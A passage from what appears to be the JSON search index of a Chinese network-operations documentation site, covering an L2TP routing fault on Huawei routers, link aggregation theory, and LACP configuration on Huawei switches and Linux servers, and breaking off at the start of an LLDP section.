\u53e3\u8f6c\u53d1\u51fa\u6765\u3002\u5927\u81f4\u53ef\u4ee5\u5224\u5b9a\u662f\u8def\u7531\u95ee\u9898\u3002</li> </ul> <p></p> <p>\u5728 Web \u7ba1\u7406\u9875\u9762\u53ef\u4ee5\u770b\u5230\u96a7\u9053\u5931\u8d25\u4fe1\u606f\u4e3a\uff1a<code>There was no SCCCN response from the peer and the packet retransmission count reached the limit</code>\u3002</p> <p></p> <p>\u8fd9\u4e2a\u5931\u8d25\u4fe1\u606f\u4e5f\u4e0e\u6293\u5305\u89c2\u6d4b\u5230\u7684\u4e0d\u7b26\u3002\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u96a7\u9053\u5efa\u7acb\u9636\u6bb5\u6210\u529f\uff0c\u8fdb\u5165\u4e86\u4f1a\u8bdd\u5efa\u7acb\u9636\u6bb5\uff0c\u56e0\u6b64\u8fd9\u4e2a\u62a5\u9519\u4e5f\u5e94\u8be5\u662f\u6709\u95ee\u9898\u7684\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#\u5206\u6790\u95ee\u9898","title":"\u5206\u6790\u95ee\u9898","text":"<p>\u5bf9\u6bd4\u4e24\u6b21 L2TP \u62e8\u53f7\uff0c\u53ef\u4ee5\u53d1\u73b0\uff1a</p> <ul> <li> <p>\u4f1a\u8bdd\u5bf9\u7aef\u5730\u5740\u4e0d\u53d8\uff0c\u59cb\u7ec8\u4e3a <code>10.0.2.72</code>\u3002</p> </li> <li> <p>\u5f53 L2TP \u4f1a\u8bdd\u5efa\u7acb\u65f6\uff0c\u534e\u4e3a\u8def\u7531\u5668\u4f1a\u81ea\u52a8\u751f\u6210\u4f1a\u8bdd\u5bf9\u7aef\u7684\u76f4\u8fde\u8def\u7531\uff1a</p> <pre><code>10.0.2.72/32  Direct  0    0           D   10.0.2.72       Virtual-Template1\n</code></pre> </li> <li> <p>\u96a7\u9053\u5bf9\u7aef\u5730\u5740\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u82e5\u4e3a <code>10.5.1.9</code>\uff08\u548c\u4f1a\u8bdd\u5bf9\u7aef\u4e0d\u540c\uff09\u5219\u6b63\u5e38\uff0c\u4e3a <code>10.0.2.72</code> \uff08\u548c\u4f1a\u8bdd\u5bf9\u7aef\u76f8\u540c\uff09\u5219\u4e0d\u6b63\u5e38\u3002</p> </li> </ul> <p>\u89c2\u5bdf LNS \u4e3a <code>10.0.2.72</code> \u7684\u4f1a\u8bdd\uff0c\u53ef\u4ee5\u53d1\u73b0\uff1a</p> <ul> <li> <p>\u4f1a\u8bdd\u5efa\u7acb\u540e\uff0c\u534e\u4e3a\u8def\u7531\u5668\u4e0d\u518d\u80fd\u591f\u5411 LNS \u53d1\u9001\u6d88\u606f\uff0c\u4e0d\u54cd\u5e94\u6765\u81ea LNS \u7684 PPP LCP Echo Request</p> </li> <li> <p>\u4e00\u65e6 LNS \u53d1\u6765 CDN \u4e2d\u65ad\u4f1a\u8bdd\u540e\uff0c\u534e\u4e3a\u8def\u7531\u5668\u53c8\u80fd\u7acb\u5373\u53d1\u9001 ZLB \u548c StopCCN\uff0c\u62c6\u9664\u96a7\u9053\u63a7\u5236\u8fde\u63a5</p> </li> <li>\u968f\u540e\u5f00\u59cb\u65b0\u4e00\u8f6e L2TP \u62e8\u53f7</li> </ul> <p>\u7efc\u5408\u4e0a\u9762\u7684\u8868\u73b0\u53ef\u4ee5\u63a8\u6d4b\uff0c\u8fd9\u662f\u534e\u4e3a\u8def\u7531\u5668\u81ea\u52a8\u751f\u6210\u4f1a\u8bdd\u5bf9\u7aef\u7684\u76f4\u8fde\u8def\u7531\uff0c\u9020\u6210\u96a7\u9053\u5bf9\u7aef\u548c\u4f1a\u8bdd\u5bf9\u7aef\u5730\u5740\u76f8\u540c\u65f6\uff0c\u4efb\u4f55\u901a\u5411\u96a7\u9053\u5bf9\u7aef\u7684\u6570\u636e\u5305\uff08\u5305\u62ec PPP LCP \u548c\u4e1a\u52a1\u6d41\u91cf\uff09\u90fd\u4f1a\u8fdb\u5165 Virtual Template \u63a5\u53e3\u5faa\u73af\uff0c\u65e0\u6cd5\u88ab\u53d1\u9001\u5230\u96a7\u9053\u5bf9\u7aef\uff0c\u6545\u4e5f\u65e0\u6cd5\u5728 WAN \u53e3\u6293\u5305\u770b\u5230\u3002\u793a\u610f\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p>\u800c\u4e00\u65e6\u4f1a\u8bdd\u7ed3\u675f\uff0c\u8be5\u8868\u9879\u88ab\u5220\u9664\uff0c\u8def\u7531\u5668\u9a6c\u4e0a\u53c8\u80fd\u6b63\u786e\u8f6c\u53d1\u5230\u8be5\u5730\u5740\u7684\u5305\uff0c\u56e0\u6b64\u80fd\u591f\u53d1\u9001 StopCCN\u3002</p> <p>\u5728 TP-Link\u3001RouterOS \u548c Windows \u8bbe\u5907\u4e0a\u67e5\u770b\u8def\u7531\u8868\uff0c\u5c31\u6ca1\u6709\u770b\u5230\u4e3a L2TP \u4f1a\u8bdd\u5bf9\u7aef\u65b0\u5efa\u7684\u6761\u76ee\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5224\u5b9a\u8def\u7531\u95ee\u9898\u5c31\u662f\u5bfc\u81f4\u534e\u4e3a\u8bbe\u5907\u5728\u8be5\u60c5\u5883\u4e0b L2TP \u5931\u8d25\u7684\u539f\u56e0\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/lag/","title":"\u94fe\u8def\u805a\u5408","text":"","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u94fe\u8def\u805a\u5408","title":"\u94fe\u8def\u805a\u5408","text":"<p>Quote</p> <p>\u672c\u6587\u6863\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea\u534e\u4e3a\u548c\u65b0\u534e\u4e09\u5b98\u65b9\u6587\u6863\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u94fe\u8def\u805a\u5408\u539f\u7406","title":"\u94fe\u8def\u805a\u5408\u539f\u7406","text":"<p>\u76f8\u5173\u7684\u6807\u51c6</p> <ul> <li>IEEE 802.3ad\uff08LACP\uff09\uff1a2000 \u5e74\u3002\u652f\u6301\u94fe\u8def\u805a\u5408\u7684\u8bbe\u5907\u57fa\u672c\u90fd\u4f7f\u7528\u8be5\u6807\u51c6\uff0c\u5305\u62ec TP-Link\u3001\u9510\u6377\u3001\u534e\u4e3a\u7b49\u3002\u8fd9\u4e9b\u8bbe\u5907\u80fd\u591f\u901a\u8fc7 LACP \u81ea\u52a8\u8c03\u6574\u72b6\u6001\uff0c\u4e00\u822c\u4e0d\u4f1a\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\u3002</li> <li>IEEE 802.1AX\uff1a2020 \u5e74\uff0c\u4f3c\u4e4e\u8fd8\u6ca1\u666e\u53ca\u3002</li> </ul> <p>\u94fe\u8def\u805a\u5408\u7ec4 LAG\uff08Link Aggregation Group\uff09\u662f\u6307\u5c06\u82e5\u5e72\u6761\u4ee5\u592a\u94fe\u8def\u6346\u7ed1\u5728\u4e00\u8d77\u6240\u5f62\u6210\u7684\u903b\u8f91\u94fe\u8def\u3002\u6bcf\u4e2a\u805a\u5408\u7ec4\u552f\u4e00\u5bf9\u5e94\u7740\u4e00\u4e2a\u903b\u8f91\u63a5\u53e3\uff0c\u8fd9\u4e2a\u903b\u8f91\u63a5\u53e3\u79f0\u4e4b\u4e3a\u94fe\u8def\u805a\u5408\u63a5\u53e3\u6216 Eth-Trunk \u63a5\u53e3\u3002\u94fe\u8def\u805a\u5408\u63a5\u53e3\u53ef\u4ee5\u4f5c\u4e3a\u666e\u901a\u7684\u4ee5\u592a\u7f51\u63a5\u53e3\u6765\u4f7f\u7528\uff0c\u4e0e\u666e\u901a\u4ee5\u592a\u7f51\u63a5\u53e3\u7684\u5dee\u522b\u5728\u4e8e\uff1a\u8f6c\u53d1\u7684\u65f6\u5019\u94fe\u8def\u805a\u5408\u7ec4\u9700\u8981\u4ece\u6210\u5458\u63a5\u53e3\u4e2d\u9009\u62e9\u4e00\u4e2a\u6216\u591a\u4e2a\u63a5\u53e3\u6765\u8fdb\u884c\u6570\u636e\u8f6c\u53d1\u3002</p> <ul> <li>\u6d3b\u52a8\u63a5\u53e3\u548c\u975e\u6d3b\u52a8\u63a5\u53e3\uff1a\u94fe\u8def\u805a\u5408\u7ec4\u7684\u6210\u5458\u63a5\u53e3\u5b58\u5728\u6d3b\u52a8\u63a5\u53e3\u548c\u975e\u6d3b\u52a8\u63a5\u53e3\u4e24\u79cd\u3002\u8f6c\u53d1\u6570\u636e\u7684\u63a5\u53e3\u79f0\u4e3a\u6d3b\u52a8\u63a5\u53e3\uff0c\u4e0d\u8f6c\u53d1\u6570\u636e\u7684\u63a5\u53e3\u79f0\u4e3a\u975e\u6d3b\u52a8\u63a5\u53e3\u3002\u5f53\u524d\u6d3b\u52a8\u63a5\u53e3\u6570\u76ee\u8fbe\u5230\u4e0a\u9650\u9608\u503c\u65f6\uff0c\u518d\u5411 Eth-Trunk \u4e2d\u6dfb\u52a0\u6210\u5458\u63a5\u53e3\uff0c\u4e0d\u4f1a\u589e\u52a0 Eth-Trunk \u6d3b\u52a8\u63a5\u53e3\u7684\u6570\u76ee\uff0c\u8d85\u8fc7\u4e0a\u9650\u9608\u503c\u7684\u94fe\u8def\u72b6\u6001\u5c06\u88ab\u7f6e\u4e3a Down\uff0c\u4f5c\u4e3a\u5907\u4efd\u94fe\u8def\u3002</li> <li>\u94fe\u8def\u805a\u5408\u6a21\u5f0f\uff1a\u6839\u636e\u662f\u5426\u542f\u7528\u94fe\u8def\u805a\u5408\u63a7\u5236\u534f\u8bae LACP\uff08Link Aggregation Control Protocol\uff09\uff0c\u94fe\u8def\u805a\u5408\u5206\u4e3a\u624b\u5de5\u6a21\u5f0f\u548c LACP \u6a21\u5f0f\u3002\u4e00\u822c\u91c7\u7528 LACP \u6a21\u5f0f\uff0c\u5b83\u57fa\u4e8e IEEE 802.3ad \u6807\u51c6\u5b9e\u73b0\u94fe\u8def\u52a8\u6001\u805a\u5408\u4e0e\u89e3\u805a\u5408\uff0c\u4ee5\u4f9b\u8bbe\u5907\u6839\u636e\u81ea\u8eab\u914d\u7f6e\u81ea\u52a8\u5f62\u6210\u805a\u5408\u94fe\u8def\u5e76\u542f\u52a8\u805a\u5408\u94fe\u8def\u6536\u53d1\u6570\u636e\u3002\u805a\u5408\u94fe\u8def\u5f62\u6210\u4ee5\u540e\uff0cLACP \u8d1f\u8d23\u7ef4\u62a4\u94fe\u8def\u72b6\u6001\uff0c\u5728\u805a\u5408\u6761\u4ef6\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u81ea\u52a8\u8c03\u6574\u94fe\u8def\u805a\u5408\u3002</li> <li>\u8d1f\u8f7d\u5206\u62c5\u65b9\u5f0f\uff1a<ul> <li>\u5728\u4f7f\u7528 Eth-Trunk \u8f6c\u53d1\u6570\u636e\u65f6\uff0c\u7531\u4e8e\u805a\u5408\u7ec4\u4e24\u7aef\u8bbe\u5907\u4e4b\u95f4\u6709\u591a\u6761\u7269\u7406\u94fe\u8def\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u540c\u4e00\u6570\u636e\u6d41\u7684\u7b2c\u4e00\u4e2a\u6570\u636e\u5e27\u5728\u4e00\u6761\u7269\u7406\u94fe\u8def\u4e0a\u4f20\u8f93\uff0c\u800c\u7b2c\u4e8c\u4e2a\u6570\u636e\u5e27\u5728\u53e6\u5916\u4e00\u6761\u7269\u7406\u94fe\u8def\u4e0a\u4f20\u8f93\u7684\u60c5\u51b5\u3002\u8fd9\u6837\u4e00\u6765\u540c\u4e00\u6570\u636e\u6d41\u7684\u7b2c\u4e8c\u4e2a\u6570\u636e\u5e27\u5c31\u6709\u53ef\u80fd\u6bd4\u7b2c\u4e00\u4e2a\u6570\u636e\u5e27\u5148\u5230\u8fbe\u5bf9\u7aef\u8bbe\u5907\uff0c\u4ece\u800c\u4ea7\u751f\u63a5\u6536\u6570\u636e\u5305\u4e71\u5e8f\u7684\u60c5\u51b5\u3002</li> <li>\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u7684\u53d1\u751f\uff0cEth-Trunk \u91c7\u7528\u9010\u6d41\u8d1f\u8f7d\u5206\u62c5\u7684\u673a\u5236\uff0c\u628a\u6570\u636e\u5e27\u4e2d\u7684\u5730\u5740\u901a\u8fc7 HASH \u7b97\u6cd5\u751f\u6210 HASH-KEY \u503c\uff0c\u7136\u540e\u6839\u636e\u8fd9\u4e2a\u6570\u503c\u5728 Eth-Trunk \u8f6c\u53d1\u8868\u4e2d\u5bfb\u627e\u5bf9\u5e94\u7684\u51fa\u63a5\u53e3\uff0c\u4e0d\u540c\u7684 MAC \u6216 IP \u5730\u5740 HASH \u5f97\u51fa\u7684 HASH-KEY \u503c\u4e0d\u540c\uff0c\u4ece\u800c\u51fa\u63a5\u53e3\u4e5f\u5c31\u4e0d\u540c\uff0c\u8fd9\u6837\u65e2\u4fdd\u8bc1\u4e86\u540c\u4e00\u6570\u636e\u6d41\u7684\u5e27\u5728\u540c\u4e00\u6761\u7269\u7406\u94fe\u8def\u8f6c\u53d1\uff0c\u53c8\u5b9e\u73b0\u4e86\u6d41\u91cf\u5728\u805a\u5408\u7ec4\u5185\u5404\u7269\u7406\u94fe\u8def\u4e0a\u7684\u8d1f\u8f7d\u5206\u62c5\u3002\u9010\u6d41\u8d1f\u8f7d\u5206\u62c5\u80fd\u4fdd\u8bc1\u5305\u7684\u987a\u5e8f\uff0c\u4f46\u4e0d\u80fd\u4fdd\u8bc1\u5e26\u5bbd\u5229\u7528\u7387\u3002</li> <li>\u534e\u4e3a\u548c\u9510\u6377\u4ea4\u6362\u673a\u90fd\u652f\u6301\u4ee5\u4e0b\u8d1f\u8f7d\u5206\u62c5\u7b97\u6cd5\uff1a\u6e90 MAC \u5730\u5740\u3001\u76ee\u7684 MAC \u5730\u5740\u3001\u6e90 MAC \u5730\u5740\u548c\u76ee\u7684 MAC \u5730\u5740\u3001\u6e90 IP \u5730\u5740\u3001\u76ee\u7684 IP \u5730\u5740\u3001\u6e90 IP \u5730\u5740\u548c\u76ee\u7684 IP \u5730\u5740\u3002</li> </ul> </li> </ul> <p>\u6ce8\u610f\u4e8b\u9879</p> <ul> <li>\u5982\u679c\u672c\u7aef\u8bbe\u5907\u63a5\u53e3\u52a0\u5165\u4e86 Eth-Trunk\uff0c\u4e0e\u8be5\u63a5\u53e3\u76f4\u8fde\u7684\u5bf9\u7aef\u63a5\u53e3\u4e5f\u5fc5\u987b\u52a0\u5165 Eth-Trunk\uff0c\u4e24\u7aef\u624d\u80fd\u6b63\u5e38\u901a\u4fe1\u3002</li> <li>Eth-Trunk \u94fe\u8def\u4e24\u7aef\u76f8\u8fde\u7684\u7269\u7406\u63a5\u53e3\u7684\u6570\u91cf\u3001\u53cc\u5de5\u65b9\u5f0f\u3001\u6d41\u63a7\u914d\u7f6e\u5fc5\u987b\u4e00\u81f4\u3002</li> <li>\u4e24\u53f0\u8bbe\u5907\u5bf9\u63a5\u65f6\u9700\u8981\u4fdd\u8bc1\u4e24\u7aef\u8bbe\u5907\u4e0a\u94fe\u8def\u805a\u5408\u7684\u6a21\u5f0f\u4e00\u81f4\u3002</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u94fe\u8def\u805a\u5408\u5b9e\u8df5","title":"\u94fe\u8def\u805a\u5408\u5b9e\u8df5","text":"","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u8def\u7531\u5668\u4ea4\u6362\u673a\u94fe\u8def\u805a\u5408","title":"\u8def\u7531\u5668\u3001\u4ea4\u6362\u673a\u94fe\u8def\u805a\u5408","text":"<p>\u601d\u8def\uff1a</p> <ol> <li>\u65b0\u5efa\u94fe\u8def\u805a\u5408\u7aef\u53e3</li> <li>\u628a\u7269\u7406\u7aef\u53e3\u52a0\u5165\u94fe\u8def\u805a\u5408\u7aef\u53e3</li> <li>\u6839\u636e\u9700\u8981\u914d\u7f6e LACP \u534f\u8bae\u7684\u5177\u4f53\u914d\u7f6e</li> </ol> <pre><code>&lt;HUAWEI&gt; system-view\n[HUAWEI] sysname SwitchA\n# \u521b\u5efa\u94fe\u8def\u805a\u5408\u63a5\u53e3 Eth-Trunk1\n[SwitchA] interface eth-trunk 1\n[SwitchA-Eth-Trunk1] mode lacp\n[SwitchA-Eth-Trunk1] quit\n# \u5c06\u7269\u7406\u63a5\u53e3\u52a0\u5165 Eth-Trunk1\n[SwitchA] interface gigabitethernet 0/0/1\n[SwitchA-GigabitEthernet0/0/1] eth-trunk 1\n[SwitchA-GigabitEthernet0/0/1] quit\n[SwitchA] interface gigabitethernet 0/0/2\n[SwitchA-GigabitEthernet0/0/2] eth-trunk 1\n[SwitchA-GigabitEthernet0/0/2] quit\n[SwitchA] interface gigabitethernet 0/0/3\n[SwitchA-GigabitEthernet0/0/3] eth-trunk 1\n[SwitchA-GigabitEthernet0/0/3] quit\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u94fe\u8def\u805a\u5408\u4e0e-vlan","title":"\u94fe\u8def\u805a\u5408\u4e0e VLAN","text":"VLAN \u4e0e LACP \u6a21\u5f0f\u94fe\u8def\u805a\u5408\u7ec4\u7f51 <p>\u914d\u7f6e Eth-Trunk \u6309\u524d\u6587\u6240\u8ff0\uff0c\u63a5\u4e0b\u6765\u548c\u666e\u901a\u7aef\u53e3\u4e00\u6837\u52a0\u5165 VLAN\uff1a</p> <pre><code>[SwitchA] vlan batch 10 20\n# \u914d\u7f6e Eth-Trunk1 \u63a5\u53e3\u5141\u8bb8 VLAN10 \u548c VLAN20 \u901a\u8fc7\u3002SwitchB \u7684\u914d\u7f6e\u4e0e SwitchA \u7c7b\u4f3c\uff0c\u4e0d\u518d\u8d58\u8ff0\u3002\n[SwitchA] interface eth-trunk 1\n[SwitchA-Eth-Trunk1] port link-type trunk\n[SwitchA-Eth-Trunk1] port trunk allow-pass vlan 10 20\n[SwitchA-Eth-Trunk1] quit\n# \u67e5\u770b\u5404 Switch \u8bbe\u5907\u7684 Eth-Trunk \u4fe1\u606f\uff0c\u67e5\u770b\u94fe\u8def\u662f\u5426\u534f\u5546\u6210\u529f\u3002\n[SwitchA] display eth-trunk 1\nEth-Trunk1's state information is:\nLocal:\nLAG ID: 1                       WorkingMode: LACP\nPreempt Delay: Disabled         Hash arithmetic: According to SIP-XOR-DIP\nSystem Priority: 100            System ID: 00e0-fca8-0417\nLeast Active-linknumber: 1      Max Active-linknumber: 2\nOperate status: up              Number Of Up Port In Trunk: 2\n--------------------------------------------------------------------------------\nActorPortName                    Status     PortType PortPri   PortNo PortKey   PortState  Weight\nGigabitEthernet0/0/1             Selected  1GE       100      6145    2865      11111100     1\nGigabitEthernet0/0/2             Selected  1GE       100      6146    2865      11111100     1\nGigabitEthernet0/0/3             Unselect  1GE       32768    6147    2865      11100000     1\n\nPartner:\n--------------------------------------------------------------------------------\nActorPortName                     SysPri    SystemID    PortPri PortNo PortKey   PortState\nGigabitEthernet0/0/1              32768  00e0-fca6-7f85  32768     6145   2609      11111100\nGigabitEthernet0/0/2              32768  00e0-fca6-7f85  32768     6146   2609      11111100\nGigabitEthernet0/0/3              32768  00e0-fca6-7f85  32768     6147   2609      11110000\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u64cd\u4f5c\u7cfb\u7edflinux\u94fe\u8def\u805a\u5408","title":"\u64cd\u4f5c\u7cfb\u7edf\uff08Linux\uff09\u94fe\u8def\u805a\u5408","text":"<p>Quote</p> <ul> <li>S \u7cfb\u5217\u4ea4\u6362\u673a\u94fe\u8def\u805a\u5408\u7279\u6027\u5bf9\u63a5\u66ff\u6362\u6307\u5bfc\u4e66</li> <li>H3C \u4ea4\u6362\u673a\u4e0e\u670d\u52a1\u5668\u5bf9\u63a5\u64cd\u4f5c\u6307\u5bfc -6W100-\u65b0\u534e\u4e09\u96c6\u56e2-H3C</li> <li>Bonding - Debian Wiki</li> <li>systemd.netdev</li> </ul> <p>Linux \u652f\u6301\u94fe\u8def\u805a\u5408\uff0c\u6545\u670d\u52a1\u5668\u7aef\u4e5f\u53ef\u4ee5\u4e0e\u7f51\u7edc\u8bbe\u65bd\u8fdb\u884c\u94fe\u8def\u805a\u5408\u3002\u4e0b\u9762\u5c55\u793a LACP \u6a21\u5f0f\u7684\u914d\u7f6e\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u51c6\u5907\u5de5\u4f5c","title":"\u51c6\u5907\u5de5\u4f5c","text":"<ul> <li>\u786e\u4fdd\u670d\u52a1\u5668\u7684\u63a5\u53e3\u6b63\u786e\u8fde\u63a5\u5230\u4ea4\u6362\u673a\u7684\u5bf9\u5e94\u7aef\u53e3</li> <li>\u4ea4\u6362\u673a\u9700\u9884\u5148\u914d\u7f6e\u4e3a LACP \u52a8\u6001\u805a\u5408\u6a21\u5f0f\uff08802.3ad\uff09</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u914d\u7f6e\u6b65\u9aa4\u4f7f\u7528-ifenslave","title":"\u914d\u7f6e\u6b65\u9aa4\uff08\u4f7f\u7528 ifenslave\uff09","text":"<ol> <li> <p>\u5b89\u88c5\u5fc5\u8981\u8f6f\u4ef6\u5305\uff1a</p> <pre><code>sudo apt update\nsudo apt install ifenslave vlan\n</code></pre> </li> <li> <p>\u52a0\u8f7d\u5185\u6838\u6a21\u5757\uff1a</p> <pre><code>echo \"bonding\" &gt;&gt; /etc/modules\necho \"8021q\" &gt;&gt; /etc/modules\nsudo modprobe bonding\nsudo modprobe 8021q\n</code></pre> </li> <li> <p>\u521b\u5efa bonding \u914d\u7f6e\u6587\u4ef6\uff1a</p> <pre><code>sudo nano /etc/modprobe.d/bonding.conf\n</code></pre> <p>\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>alias bond0 bonding\noptions bonding mode=4 miimon=100 downdelay=200 updelay=200 lacp_rate=1\n</code></pre> </li> <li> <p>\u914d\u7f6e\u7f51\u7edc\u63a5\u53e3\uff08\u793a\u4f8b\u4f7f\u7528 2 \u4e2a\u63a5\u53e3\uff0c\u53ef\u6269\u5c55\u81f3 4 \u4e2a\uff09\uff1a</p> <pre><code>sudo nano /etc/network/interfaces\n</code></pre> <p>\u6dfb\u52a0\u4ee5\u4e0b\u914d\u7f6e\uff1a</p> <pre><code># \u7269\u7406\u63a5\u53e3\u914d\u7f6e\nauto enp1s0f0\niface enp1s0f0 inet manual\n    bond-master bond0\n\nauto enp1s0f1\niface enp1s0f1 inet manual\n    bond-master bond0\n\n# LACP \u805a\u5408\u914d\u7f6e\nauto bond0\niface bond0 inet manual\n    bond-mode 4                # 802.3ad (LACP)\n    bond-miimon 100            # \u94fe\u8def\u68c0\u6d4b\u95f4\u9694\uff08\u6beb\u79d2\uff09\n    bond-downdelay 200         # \u63a5\u53e3\u4e0b\u7ebf\u5ef6\u8fdf\n    bond-updelay 200           # \u63a5\u53e3\u4e0a\u7ebf\u5ef6\u8fdf\n    bond-lacp-rate 1           # LACP \u901f\u7387\uff081=fast, 0=slow\uff09\n    bond-xmit-hash-policy layer2+3  # \u6d41\u91cf\u5206\u53d1\u7b56\u7565\n    address 192.168.1.100      # \u670d\u52a1\u5668 IP\n    netmask 255.255.255.0\n    gateway 192.168.1.1\n    mtu 9000                   # \u5efa\u8bae\u4e0e\u4ea4\u6362\u673a\u4e00\u81f4\uff08\u5982\u542f\u7528\u5de8\u5e27\uff09\n</code></pre> </li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u914d\u7f6e\u6b65\u9aa4\u4f7f\u7528-systemd-networkd","title":"\u914d\u7f6e\u6b65\u9aa4\uff08\u4f7f\u7528 systemd-networkd\uff09","text":"<ol> <li> <p>\u521b\u5efa bonding \u914d\u7f6e\u6587\u4ef6\uff1a</p> /etc/systemd/network/bond0.netdev<pre><code>[NetDev]\nName=bond0\nDescription=LACP to H3C Switch\nKind=bond\n\n[Bond]\nMode=802.3ad\nMIIMonitorSec=100ms\n</code></pre> </li> <li> <p>\u521b\u5efa\u7f51\u7edc\u63a5\u53e3\u914d\u7f6e\u6587\u4ef6\uff1a</p> /etc/systemd/network/bond0.network<pre><code>[Match]\nName=ens*\n\n[Network]\nBond=bond0\nAddress=\nGateway=\nDNS=\n</code></pre> </li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#\u9a8c\u8bc1\u914d\u7f6e","title":"\u9a8c\u8bc1\u914d\u7f6e","text":"<ol> <li> <p>\u67e5\u770b bond \u72b6\u6001\uff1a</p> <pre><code>cat /proc/net/bonding/bond0\n</code></pre> <p>\u5e94\u770b\u5230\uff1a</p> <ul> <li>Bonding Mode: IEEE 802.3ad Dynamic link aggregation</li> <li>\u6240\u6709 Slave \u63a5\u53e3\u72b6\u6001\u4e3a up</li> <li>\u6b63\u786e\u7684 LACP Partner \u4fe1\u606f</li> </ul> </li> <li> <p>\u6d4b\u8bd5\u7f51\u7edc\u8fde\u901a\u6027\uff1a</p> <pre><code>ping -I bond0.123 10.123.0.1\n</code></pre> </li> </ol> <p>\u6ce8\u610f\u4e8b\u9879</p> <ol> <li> <p>MTU \u4e00\u81f4\u6027\uff1a</p> <ul> <li>\u6240\u6709\u7269\u7406\u63a5\u53e3\u3001bond \u63a5\u53e3\u548c VLAN \u63a5\u53e3\u7684 MTU \u5fc5\u987b\u5339\u914d</li> <li>\u4ea4\u6362\u673a\u7aef\u63a5\u53e3\u9700\u540c\u6837\u914d\u7f6e MTU 9000\uff08\u5982\u4f7f\u7528 jumbo frames\uff09</li> </ul> </li> <li> <p>LACP \u53c2\u6570\u5339\u914d\uff1a</p> <ul> <li><code>bond-lacp-rate 1</code>\u5bf9\u5e94\u4ea4\u6362\u673a\u7684 fast \u6a21\u5f0f\uff08H3C \u9ed8\u8ba4\uff09</li> <li><code>bond-mode 4</code>\u5fc5\u987b\u4e0e\u4ea4\u6362\u673a\u7684 dynamic \u805a\u5408\u6a21\u5f0f\u5bf9\u5e94</li> </ul> </li> <li> <p>\u591a\u63a5\u53e3\u5904\u7406\uff1a</p> <ul> <li>\u5982\u9700\u4f7f\u7528\u5168\u90e8 4 \u4e2a\u63a5\u53e3\uff0c\u5728 bond-slaves \u4e2d\u6dfb\u52a0\u6240\u6709\u63a5\u53e3\u540d</li> <li>\u4ea4\u6362\u673a\u4fa7\u9700\u5c06 4 \u4e2a\u63a5\u53e3\u52a0\u5165\u540c\u4e00\u805a\u5408\u7ec4</li> </ul> </li> <li> <p>\u6545\u969c\u6392\u67e5\uff1a</p> <ul> <li>\u68c0\u67e5<code>dmesg | grep bond</code>\u662f\u5426\u6709\u9519\u8bef</li> <li>\u4f7f\u7528<code>ethtool &lt;interface&gt;</code>\u68c0\u67e5\u7269\u7406\u94fe\u8def\u72b6\u6001</li> <li>\u4ea4\u6362\u673a\u4fa7\u4f7f\u7528<code>display link-aggregation verbose</code>\u9a8c\u8bc1\u805a\u5408\u72b6\u6001</li> </ul> </li> <li> <p>\u6027\u80fd\u4f18\u5316\uff1a</p> <ul> <li>\u5bf9\u4e8e 10G \u63a5\u53e3\uff0c\u5efa\u8bae\u4f7f\u7528<code>bond-xmit-hash-policy layer3+4</code></li> <li>\u53ef\u8c03\u6574<code>miimon</code>\u4e3a\u66f4\u77ed\u95f4\u9694\uff08\u5982 50ms\uff09\u5b9e\u73b0\u5feb\u901f\u6545\u969c\u68c0\u6d4b</li> </ul> </li> <li> <p>\u7f51\u7edc\u670d\u52a1\u91cd\u542f\uff1a</p> <pre><code>systemctl restart networking\n</code></pre> </li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/lag/#bootloader-\u94fe\u8def\u805a\u5408","title":"Bootloader \u94fe\u8def\u805a\u5408","text":"<p>https://edk2.groups.io/g/discuss/topic/bonding_support_for_pxe_boot/80424734</p> <p>https://www.reddit.com/r/networking/comments/opciu4/problem_with_pxe_boot_over_lacp_on_aruba_switches/</p>","tags":["stable"]},{"location":"operation/network/network-technology/lldp/","title":"LLDP","text":"","tags":["stable"]},{"location":"operation/network/network-technology/lldp/#lldp","title":"LLDP","text":"","tags":["stable"]},{"location":"operation/network/network-technology/lldp/#lldp-\u539f\u7406","title":"LLDP \u539f\u7406","text":"<p>Quote</p> <ul> <li>\u534e\u4e3a\u6587\u6863</li> </ul> <p>LLDP\uff08Link Layer Discovery Protocol\uff09\u662f IEEE 802.1ab \u4e2d\u5b9a\u4e49\u7684\u94fe\u8def\u5c42\u53d1\u73b0\u534f\u8bae\u3002LLDP \u662f\u4e00\u79cd\u6807\u51c6\u7684\u4e8c\u5c42\u53d1\u73b0\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5c06\u672c\u7aef\u8bbe\u5907\u7684\u7ba1\u7406\u5730\u5740\u3001\u8bbe\u5907\u6807\u8bc6\u3001\u63a5\u53e3\u6807\u8bc6\u7b49\u4fe1\u606f\u7ec4\u7ec7\u8d77\u6765\uff0c\u5e76\u53d1\u5e03\u7ed9\u81ea\u5df1\u7684\u90bb\u5c45\u8bbe\u5907\uff0c\u90bb\u5c45\u8bbe\u5907\u6536\u5230\u8fd9\u4e9b\u4fe1\u606f\u540e\u5c06\u5176\u4ee5\u6807\u51c6\u7684\u7ba1\u7406\u4fe1\u606f\u5e93 MIB\uff08Management Information 